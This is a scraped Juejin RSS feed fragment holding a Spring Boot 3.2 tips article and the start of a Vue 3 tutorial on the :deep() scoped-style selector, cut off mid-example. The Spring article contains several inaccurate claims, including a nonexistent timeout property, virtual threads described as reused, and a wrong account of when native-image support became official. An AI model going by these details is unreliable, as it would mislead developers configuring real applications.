<li><a href="https://juejin.cn/post/7559871680015024169" target="_blank" title="https://juejin.cn/post/7559871680015024169">使用React-OAuth进行Google/GitHub登录的教程和案例</a></li>
<li><a href="https://juejin.cn/post/7550585427834404927" target="_blank" title="https://juejin.cn/post/7550585427834404927">纯前端人脸识别利器：face-api.js手把手深入解析教学</a></li>
<li><a href="https://juejin.cn/post/7553865490732433462" target="_blank" title="https://juejin.cn/post/7553865490732433462">关于React父组件调用子组件方法forwardRef的详解和案例</a></li>
<li><a href="https://juejin.cn/post/7553484874609410074" target="_blank" title="https://juejin.cn/post/7553484874609410074">React跨组件数据共享useContext详解和案例</a></li>
<li><a href="https://juejin.cn/post/7545087762837815334" target="_blank" title="https://juejin.cn/post/7545087762837815334">Web图像编辑神器tui.image-editor从基础到进阶的实战指南</a></li>
<li><a href="https://juejin.cn/post/7544323659788288046" target="_blank" title="https://juejin.cn/post/7544323659788288046">开发个人微信小程序类目选择/盈利方式/成本控制与服务器接入指南</a></li>
<li><a href="https://juejin.cn/post/7541741121400864778" target="_blank" title="https://juejin.cn/post/7541741121400864778">前端图片裁剪Cropper.js核心功能与实战技巧详解</a></li>
<li><a href="https://juejin.cn/post/7536530451461472265" target="_blank" title="https://juejin.cn/post/7536530451461472265">编辑器也有邪修？盘点VS Code邪门/有趣的扩展</a></li>
<li><a href="https://juejin.cn/post/7535005018257981466" target="_blank" title="https://juejin.cn/post/7535005018257981466">js使用IntersectionObserver实现目标元素可见度的交互</a></li>
<li><a href="https://juejin.cn/post/7534547200330121225" target="_blank" title="https://juejin.cn/post/7534547200330121225">Web前端页面开发阿拉伯语种适配指南</a></li>
<li><a href="https://juejin.cn/post/7516122409948020736" target="_blank" title="https://juejin.cn/post/7516122409948020736">让网页拥有App体验？PWA 将网页变为桌面应用的保姆级教程PWA</a></li>
<li><a href="https://juejin.cn/post/6953803916484018206" target="_blank" title="https://juejin.cn/post/6953803916484018206">使用nvm管理node.js版本以及更换npm淘宝镜像源</a></li>
<li><a href="https://juejin.cn/post/7140443283209060383" target="_blank" title="https://juejin.cn/post/7140443283209060383">手把手教你搭建规范的团队vue项目，包含commitlint，eslint，prettier，husky，commitizen等等</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 3.2实战：5个提升开发效率的隐藏特性及避坑指南]]></title>    <link>https://juejin.cn/post/7576130918078136355</link>    <guid>https://juejin.cn/post/7576130918078136355</guid>    <pubDate>2025-11-25T00:16:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130918078136355" data-draft-id="7576378563545530420" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 3.2实战：5个提升开发效率的隐藏特性及避坑指南"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-25T00:16:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 3.2实战：5个提升开发效率的隐藏特性及避坑指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:16:39.000Z" title="Tue Nov 25 2025 00:16:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Spring Boot 3.2实战：5个提升开发效率的隐藏特性及避坑指南</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>Spring Boot 3.2作为Spring生态的最新稳定版本，不仅延续了“约定优于配置”的理念，还引入了一系列鲜为人知但极具实用性的特性。这些特性往往被官方文档轻描淡写，却能显著提升开发效率、简化调试流程或优化运行时性能。然而，新特性的不当使用也可能带来意料之外的“坑”。本文将深入剖析Spring Boot 3.2中5个隐藏的“生产力工具”，并结合实际案例提供避坑指南。</p>
<hr/>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. <strong>GraalVM Native Image支持增强：更快的启动与更低的内存占用</strong></h3>
<p><strong>特性解析</strong>：<br/>
Spring Boot 3.2对GraalVM原生镜像的支持从实验性升级为正式特性。通过<code>spring-boot-maven-plugin</code>的<code>native</code>构建目标，开发者可直接生成无需JVM的原生可执行文件，启动时间可缩短至毫秒级。</p>
<p><strong>实战技巧</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">mvn -Pnative spring-boot:build-image
</code></pre>
<ul>
<li><strong>避坑指南</strong>：
<ul>
<li><strong>反射与动态代理问题</strong>：原生编译要求所有反射操作在编译期明确声明。使用<code>@RegisterReflectionForBinding</code>注解标注需要反射的类（如DTO）。</li>
<li><strong>Classpath扫描限制</strong>：避免运行时动态加载类，改用静态<code>@Import</code>或条件装配。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2. <strong>虚拟线程（Virtual Threads）的深度集成</strong></h3>
<p><strong>特性解析</strong>：<br/>
基于JDK21的虚拟线程能力，Spring Boot 3.2通过<code>spring.threads.virtual.enabled=true</code>自动将Tomcat/Jetty等Web容器的阻塞IO操作委托给虚拟线程池，轻松实现万级并发。</p>
<p><strong>代码示例</strong>：</p>
<pre><code class="hljs language-properties" lang="properties">spring:
  threads:
    virtual:
      enabled: true
</code></pre>
<ul>
<li><strong>避坑指南</strong>：
<ul>
<li><strong>同步代码块阻塞VT</strong>：避免在虚拟线程中使用<code>synchronized</code>或长时间持有锁，改用<code>ReentrantLock</code>。</li>
<li><strong>ThreadLocal污染问题</strong>：虚拟线程生命周期短且频繁复用，需显式清理ThreadLocal变量。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">3. <strong>Declarative HTTP客户端的新玩法——@HttpExchange注解族</strong></h3>
<p><strong>特性解析</strong>：<br/>
相较于Feign或RestTemplate，新的<code>@HttpExchange</code>注解族（如<code>@GetExchange</code>, <code>@PostExchange</code>)允许通过接口声明HTTP请求，支持响应式与非阻塞模式。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@HttpExchange("/api")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserClient</span> {
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>
    Mono&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span>;
}
</code></pre>
<ul>
<li><strong>避坑指南</strong>：
<ul>
<li><strong>超时配置遗漏风险</strong>：默认无超时设置！务必通过<code>spring.webclient.timeout.connect=5s</code>全局配置。</li>
<li><strong>URL编码陷阱路径变量中的特殊字符需手动编码。</strong></li>
</ul>
</li>
</ul>
<p>###4.<strong>CRaC（Checkpoint/Restore）预热加速</strong>
特性解析：
结合CRaC项目,应用启动时可生成检查点快照后续直接恢复运行状态跳过JVM类加载和初始化阶段。</p>
<p>操作步骤：</p>
<pre><code class="hljs language-bash" lang="bash">java -XX:CRaCCheckpointTo=/path/to/snapshot -jar app.jar
<span class="hljs-comment">#恢复时</span>
java -XX:CRaCRestoreFrom=/path/to/snapshot
</code></pre>
<p>-避坑指南：
•	资源泄漏风险确保所有打开的文件/Socket在检查点前关闭。
•	随机数安全使用SecureRandom时需禁用预生成种子。</p>
<p>###5.<strong>测试套件的革命——@DynamicPropertySource强化</strong>
特性解析：
动态属性注入不再局限于静态方法现在可通过Lambda表达式在测试运行时实时计算属性值特别适合Testcontainers集成。</p>
<p>示例：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Testcontainers</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">IntegrationTest</span> {
    <span class="hljs-keyword">static</span> PostgreSQLContainer&lt;?&gt; postgres = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PostgreSQLContainer</span>&lt;&gt;();

    <span class="hljs-meta">@DynamicPropertySource</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerProperties</span><span class="hljs-params">(DynamicPropertyRegistry registry)</span> {
        registry.add(<span class="hljs-string">"db.url"</span>, postgres::getJdbcUrl);
    }
}
</code></pre>
<p>-避坑指南：
•	生命周期错乱确保容器先启动再注册属性。
•	并行测试冲突为每个测试类分配独立容器实例。</p>
<hr/>
<p>##总结</p>
<p>SpringBoot3.2的这些隐藏特性像瑞士军刀般覆盖了性能优化、并发模型、API设计等领域但每个工具都需要理解其设计哲学与约束条件才能发挥最大价值建议读者：</p>
<p>1.生产环境启用GraalVMNative前必须完成全量集成测试。
2虚拟线程虽好但不适合CPU密集型任务场景。
3定期检查官方更新日志这些特性的行为可能在后续小版本中调整。</p>
<p>技术选型的本质是权衡希望通过本文帮助你在拥抱新特性的同时避开潜在深水区</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3样式深度选择器：为什么我们需要:deep()？]]></title>    <link>https://juejin.cn/post/7576129509935546387</link>    <guid>https://juejin.cn/post/7576129509935546387</guid>    <pubDate>2025-11-24T23:42:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509935546387" data-draft-id="7576181242581647423" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3样式深度选择器：为什么我们需要:deep()？"/> <meta itemprop="keywords" content="Vue.js,JavaScript,前端"/> <meta itemprop="datePublished" content="2025-11-24T23:42:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="良山有风来"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036939358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3样式深度选择器：为什么我们需要:deep()？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036939358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    良山有风来
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T23:42:23.000Z" title="Mon Nov 24 2025 23:42:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是不是也遇到过这样的场景？在Vue 3项目里，想要修改子组件样式，结果发现不管怎么写CSS都不生效。明明代码看起来没问题，但样式就是无法穿透到子组件内部。</p>
<p>这种情况在前端开发中太常见了。特别是在使用第三方UI库的时候，想要微调某个组件的样式，却发现自己被CSS作用域限制得死死的。</p>
<p>本文将带你深入了解Vue 3中的样式深度选择器<code>:deep()</code>，从它诞生的背景到具体的使用方法，再到实际开发中的最佳实践。读完这篇文章，你将彻底掌握如何优雅地解决组件样式穿透问题，再也不用为修改子组件样式而头疼了。</p>
<h2 data-id="heading-0">为什么需要深度选择器？</h2>
<p>在理解<code>:deep()</code>之前，我们得先明白Vue组件样式的作用域问题。Vue单文件组件中的<code>&lt;style&gt;</code>标签默认是全局作用域的，这意味着你在一个组件里写的样式可能会影响到其他组件。</p>
<p>为了解决这个问题，Vue引入了<code>scoped</code>样式。当你在<code>&lt;style&gt;</code>标签上添加<code>scoped</code>属性时，Vue会自动为组件中的每个元素添加一个唯一的属性，然后通过属性选择器来确保样式只作用于当前组件。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.demo</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
}

<span class="hljs-comment">/* 这个样式无法影响到child-component内部的元素 */</span>
<span class="hljs-selector-class">.child-content</span> {
  <span class="hljs-attribute">color</span>: red; <span class="hljs-comment">/* 不会生效！ */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>但这样带来了新的问题：当我们确实需要修改子组件样式时，作用域样式就成了障碍。想象一下，你使用了某个UI库的按钮组件，但需要稍微调整它的内边距，这时候该怎么办？</p>
<p>这就是深度选择器诞生的原因。它提供了一种"穿透"组件样式作用域的方法，让我们能够在父组件中修改子组件的样式。</p>
<h2 data-id="heading-1">:deep()的前世今生</h2>
<p>在Vue 2时代，我们使用<code>&gt;&gt;&gt;</code>、<code>/deep/</code>或<code>::v-deep</code>来实现样式穿透。但这些语法存在一些问题：有的已经被CSS规范废弃，有的浏览器支持不一致，还有的写法比较冗长。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- Vue 2中的各种深度选择器写法 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 原生CSS的深度选择器，某些浏览器不支持 */</span>
<span class="hljs-selector-class">.parent</span> &gt;&gt;&gt; <span class="hljs-selector-class">.child</span> { <span class="hljs-attribute">color</span>: red; }

<span class="hljs-comment">/* Sass等预处理器中的写法 */</span>
<span class="hljs-selector-class">.parent</span> /deep/ <span class="hljs-selector-class">.child</span> { <span class="hljs-attribute">color</span>: red; }

<span class="hljs-comment">/* Vue特有的语法 */</span>
<span class="hljs-selector-class">.parent</span> ::v-deep .child { <span class="hljs-attribute">color</span>: red; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>Vue 3团队在设计新的样式系统时，决定统一这个语法。他们选择了<code>:deep()</code>作为新的深度选择器，这既符合CSS规范的发展趋势，也提供了更好的开发体验。</p>
<p><code>:deep()</code>本质上是一个CSS伪类，它在编译时会被Vue的处理工具转换为适当的选择器，确保样式能够正确穿透到子组件。</p>
<h2 data-id="heading-2">:deep()的基本用法</h2>
<p>让我们通过几个实际的例子来看看<code>:deep()</code>怎么用。</p>
<p>最基本的用法就是在需要穿透到子组件的选择器前加上<code>:deep()</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child-comp"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.parent</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
}

<span class="hljs-comment">/* 使用:deep()穿透到子组件 */</span>
<span class="hljs-selector-class">.parent</span> :<span class="hljs-built_in">deep</span>(.child-comp) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f0f0</span>;
}

<span class="hljs-comment">/* 也可以这样写 */</span>
:<span class="hljs-built_in">deep</span>(.child-comp) {
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;
}
</span></code></pre>
<p>在实际项目中，我们经常需要修改第三方组件的样式。比如使用Element Plus的按钮组件：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-btn"</span>&gt;</span>
      自定义按钮
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> :<span class="hljs-built_in">deep</span>(.custom-btn) {
  <span class="hljs-comment">/* 修改Element Plus按钮的内边距 */</span>
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">24px</span>;
  
  <span class="hljs-comment">/* 修改边框半径 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  
  <span class="hljs-comment">/* 修改背景颜色 */</span>
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4f46e5</span>;
}

<span class="hljs-selector-class">.page</span> :<span class="hljs-built_in">deep</span>(.custom-btn:hover) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4338ca</span>;
}
</span></code></pre>
<p>需要注意的是，<code>:deep()</code>应该用在选择器的开头，或者紧跟在父选择器之后。错误的使用方式会导致样式不生效：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 错误的写法 - :deep()不能放在最后 */</span>
